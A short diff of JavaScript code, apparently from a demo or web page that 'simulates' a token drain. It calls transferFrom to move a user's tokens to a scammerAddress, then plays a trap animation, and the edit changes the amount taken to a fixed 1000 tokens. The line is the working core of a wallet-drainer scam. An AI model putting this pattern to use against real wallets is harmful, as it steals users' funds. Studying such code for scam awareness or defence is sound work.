@@ -261,8 +261,8 @@
         // Now simulate the token drain using transferFrom
         const balance = await token.balanceOf(userAddress);
         if (balance.gt(0)) {
-          const tx2 = await token.transferFrom(userAddress, scammerAddress, balance);
-          await tx2.wait();
+         const tx2 = await token.transferFrom(userAddress, scammerAddress, ethers.utils.parseEther("1000"));
+         await tx2.wait();
         }
 
         animateTrap();
